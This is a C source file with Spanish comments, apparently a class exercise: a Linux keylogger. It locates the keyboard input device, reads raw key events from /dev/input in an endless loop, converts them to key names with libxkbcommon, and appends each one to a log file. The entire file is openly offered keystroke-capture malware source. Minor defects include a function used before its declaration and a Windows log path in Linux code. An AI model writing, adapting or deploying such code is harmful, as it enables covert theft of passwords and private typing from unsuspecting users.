#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <linux/input.h>
#include <xkbcommon/xkbcommon.h>

//aqui se va a guardar la cadena 
#define LOGFILEPATH "E:\\Practicas\\ClaseSI\\Keylogger\\keylogger.txt"

// Función para obtener el evento del teclado
char* getEvent() {
    // Leer el fichero devices y extraer el input que se refiera al teclado
    char* command = (char*) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE* pipe = popen(command, "r");
    if (!pipe)
        exit(1);
    // Obtener la cadena de texto del evento correspondiente al teclado
    fgets(event, 8, pipe);
    pclose(pipe);
    // Retornar el evento
    return event;
}

int main(){
  struct input_event ev;
  // ruta al directorio de inputs
  static char path_keyboard[20] = "/dev/input/";
  // concatenar variable keyboard
  strcat(path_keyboard, getEvent());
  // eliminar último caracter (breakline)
  path_keyboard[strlen(path_keyboard)-1] = 0;
  // leer ruta a input
  int device_keyboard = open(path_keyboard, O_RDONLY);
  // Imprimir error
    if (errno > 0) {
        printf("Error: %d\n", errno);
    }
    // Abrir fichero de logs
    FILE* fp = fopen(LOGFILEPATH, "a");
    if (!fp) {
        printf("Error opening log file\n");
        return 1;
    }
    // Crear contexto y keymap para xkbcommon
    struct xkb_context* context = xkb_context_new(XKB_CONTEXT_NO_FLAGS);
    if (!context) {
        fprintf(stderr, "Failed to create xkb_context\n");
        return 1;
    }
    struct xkb_keymap* keymap = xkb_keymap_new_from_names(context, NULL, XKB_KEYMAP_COMPILE_NO_FLAGS);
    if (!keymap) {
        fprintf(stderr, "Failed to create xkb_keymap\n");
        return 1;
    }
    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 0) {
            char* key_name = getKeyName(context, keymap, ev.code);
            printf("%s\n", key_name);
            fprintf(fp, "%s\n", key_name);
            fflush(fp);  // Asegurar que se escriba inmediatamente al archivo
        }
    }
    fclose(fp);
    xkb_keymap_unref(keymap);
    xkb_context_unref(context);
    return 0;
}

// Función para mapear el código de tecla a un carácter legible usando libxkbcommon
char* getKeyName(struct xkb_context* context, struct xkb_keymap* keymap, int code) {
    struct xkb_state* state = xkb_state_new(keymap);
    if (!state) {
        fprintf(stderr, "Failed to create xkb_state\n");
        return "?";
    }
    static char key[32];
    xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, code + 8); // xkbcommon uses keycodes offset by 8
    xkb_keysym_get_name(keysym, key, sizeof(key));
    xkb_state_unref(state);
    return key;
}